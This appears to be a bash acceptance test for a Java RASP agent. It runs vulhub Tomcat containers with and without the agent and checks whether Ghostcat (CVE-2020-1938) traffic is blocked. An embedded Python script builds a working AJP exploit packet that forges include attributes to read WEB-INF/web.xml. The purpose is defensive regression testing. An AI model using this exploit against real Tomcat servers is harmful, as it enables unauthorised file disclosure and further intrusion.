#!/usr/bin/env bash
set -euo pipefail

image="${OHMYRASP_VULHUB_TOMCAT_1938_IMAGE:-vulhub/tomcat:9.0.30}"
baseline_name="${OHMYRASP_VULHUB_TOMCAT_1938_BASELINE_NAME:-ohmyrasp-vulhub-tomcat1938-baseline}"
protected_name="${OHMYRASP_VULHUB_TOMCAT_1938_PROTECTED_NAME:-ohmyrasp-vulhub-tomcat1938-protected}"
baseline_http_port="${OHMYRASP_VULHUB_TOMCAT_1938_BASELINE_HTTP_PORT:-18695}"
baseline_ajp_port="${OHMYRASP_VULHUB_TOMCAT_1938_BASELINE_AJP_PORT:-18696}"
protected_http_port="${OHMYRASP_VULHUB_TOMCAT_1938_PROTECTED_HTTP_PORT:-18697}"
protected_ajp_port="${OHMYRASP_VULHUB_TOMCAT_1938_PROTECTED_AJP_PORT:-18698}"

script_dir="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
repo_root="$(cd -- "${script_dir}/../.." && pwd)"
agent_root="${repo_root}/java-agent"
agent_jar="${agent_root}/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
work_dir="${OHMYRASP_VULHUB_TOMCAT_1938_WORK_DIR:-/tmp/ohmyrasp-tomcat1938}"
baseline_home="${work_dir}/baseline-home.html"
baseline_response="${work_dir}/baseline-ajp-webxml.txt"
protected_home="${work_dir}/protected-home.html"
protected_response="${work_dir}/protected-ajp-webxml.txt"
protected_logs="${work_dir}/protected-logs"
protected_log="${protected_logs}/events.jsonl"

cleanup() {
  docker logs "${baseline_name}" > "${work_dir}/baseline-container.log" 2>&1 || true
  docker logs "${protected_name}" > "${work_dir}/protected-container.log" 2>&1 || true
  docker rm -f "${baseline_name}" "${protected_name}" >/dev/null 2>&1 || true
}

trap cleanup EXIT

wait_for_http() {
  local port="$1"
  local name="$2"
  local output="$3"
  for attempt in $(seq 1 120); do
    local status
    status="$(curl -sS -o "${output}" -w '%{http_code}' "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "${status}" == "200" ]] && grep -Fq "Apache Tomcat" "${output}"; then
      return 0
    fi
    sleep 1
  done
  echo "Tomcat ${name} did not become ready on HTTP port ${port}" >&2
  docker logs --tail 200 "${name}" >&2 || true
  return 1
}

wait_for_agent_startup() {
  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java8-agent-start"' "${protected_log}"; then
      if ! grep -Fq '"request_hook":"installed"' "${protected_log}"; then
        cat "${protected_log}" >&2
        echo "protected Tomcat Java8 agent did not report installed request hook" >&2
        exit 1
      fi
      return 0
    fi
    sleep 1
  done
  cat "${protected_log}" >&2 || true
  echo "missing Java8 agent startup event for Tomcat CVE-2020-1938 protected container" >&2
  exit 1
}

send_ajp_webxml_read() {
  local port="$1"
  local output="$2"
  python3 - "${port}" > "${output}" <<'PY'
import socket
import struct
import sys

host = "127.0.0.1"
port = int(sys.argv[1])


def ajp_string(value):
    if value is None:
        return struct.pack(">H", 0xFFFF)
    data = value.encode("utf-8")
    return struct.pack(">H", len(data)) + data + b"\x00"


def packet(payload):
    return b"\x12\x34" + struct.pack(">H", len(payload)) + payload


payload = bytearray()
payload.append(0x02)
payload.append(0x02)
payload += ajp_string("HTTP/1.1")
payload += ajp_string("/asdf")
payload += ajp_string("127.0.0.1")
payload += ajp_string("localhost")
payload += ajp_string("localhost")
payload += struct.pack(">H", 80)
payload.append(0)
payload += struct.pack(">H", 2)
payload += struct.pack(">H", 0xA00B) + ajp_string("localhost")
payload += struct.pack(">H", 0xA00E) + ajp_string("ohmyrasp-ghostcat-check")
for name, value in [
    ("javax.servlet.include.request_uri", "/"),
    ("javax.servlet.include.path_info", "WEB-INF/web.xml"),
    ("javax.servlet.include.servlet_path", "/"),
]:
    payload.append(0x0A)
    payload += ajp_string(name)
    payload += ajp_string(value)
payload.append(0xFF)

body = bytearray()
status = None
with socket.create_connection((host, port), timeout=10) as sock:
    sock.sendall(packet(payload))
    sock.settimeout(10)
    while True:
        header = sock.recv(4)
        if not header:
            break
        if len(header) != 4:
            raise RuntimeError("short AJP packet header")
        magic, length = struct.unpack(">HH", header)
        data = b""
        while len(data) < length:
            chunk = sock.recv(length - len(data))
            if not chunk:
                raise RuntimeError("short AJP packet body")
            data += chunk
        if magic != 0x4142 or not data:
            continue
        prefix = data[0]
        if prefix == 0x04:
            status = struct.unpack(">H", data[1:3])[0]
        elif prefix == 0x03 and len(data) >= 3:
            chunk_len = struct.unpack(">H", data[1:3])[0]
            body += data[3:3 + chunk_len]
        elif prefix == 0x05:
            break

print("AJP_STATUS=%s" % (status if status is not None else "unknown"))
print(body.decode("utf-8", "replace"))
PY
}

block_count() {
  grep -Ec '"algorithm":"java8_request_forged_include_attribute".*"action":"block"' "${protected_log}" 2>/dev/null || true
}

docker run --rm \
  -v "${agent_root}:/workspace" \
  -w /workspace \
  gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "${work_dir}"
mkdir -p "${protected_logs}"
: > "${protected_log}"
chmod 777 "${protected_logs}"
chmod 666 "${protected_log}"
cleanup

docker run --rm "${image}" java -version > "${work_dir}/image-java-version.txt" 2>&1 || true
if ! grep -Fq '1.8.0_242' "${work_dir}/image-java-version.txt"; then
  cat "${work_dir}/image-java-version.txt" >&2 || true
  echo "Tomcat CVE-2020-1938 image did not report the expected Java 8 runtime" >&2
  exit 1
fi

docker run -d \
  --name "${baseline_name}" \
  -p "${baseline_http_port}:8080" \
  -p "${baseline_ajp_port}:8009" \
  "${image}" >/dev/null

docker run -d \
  --name "${protected_name}" \
  -p "${protected_http_port}:8080" \
  -p "${protected_ajp_port}:8009" \
  -v "${agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "${protected_logs}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "${image}" >/dev/null

wait_for_http "${baseline_http_port}" "${baseline_name}" "${baseline_home}"
wait_for_agent_startup
wait_for_http "${protected_http_port}" "${protected_name}" "${protected_home}"

if grep -Fq '"event":"ohmyrasp-detection"' "${protected_log}"; then
  cat "${protected_log}" >&2
  echo "protected Tomcat CVE-2020-1938 produced a detection before AJP exploit traffic" >&2
  exit 1
fi

send_ajp_webxml_read "${baseline_ajp_port}" "${baseline_response}"
if ! grep -Fq "AJP_STATUS=200" "${baseline_response}" \
  || ! grep -Fq "<web-app" "${baseline_response}" \
  || ! grep -Fq "Welcome to Tomcat" "${baseline_response}"; then
  echo "baseline Tomcat CVE-2020-1938 AJP request did not disclose WEB-INF/web.xml" >&2
  cat "${baseline_response}" >&2 || true
  docker logs --tail 120 "${baseline_name}" >&2 || true
  exit 1
fi

before_count="$(block_count)"
send_ajp_webxml_read "${protected_ajp_port}" "${protected_response}"
for _ in $(seq 1 20); do
  after_count="$(block_count)"
  if [[ "${after_count}" -gt "${before_count}" ]]; then
    break
  fi
  sleep 1
done

after_count="$(block_count)"
if [[ "${after_count}" -le "${before_count}" ]]; then
  echo "missing java8_request_forged_include_attribute block event for Tomcat CVE-2020-1938" >&2
  cat "${protected_log}" >&2 || true
  cat "${protected_response}" >&2 || true
  exit 1
fi

if grep -Fq "<web-app" "${protected_response}" || grep -Fq "Welcome to Tomcat" "${protected_response}"; then
  echo "protected Tomcat CVE-2020-1938 disclosed WEB-INF/web.xml despite RASP" >&2
  cat "${protected_log}" >&2 || true
  cat "${protected_response}" >&2 || true
  exit 1
fi

echo "vulhub Tomcat CVE-2020-1938 Java8 acceptance passed"
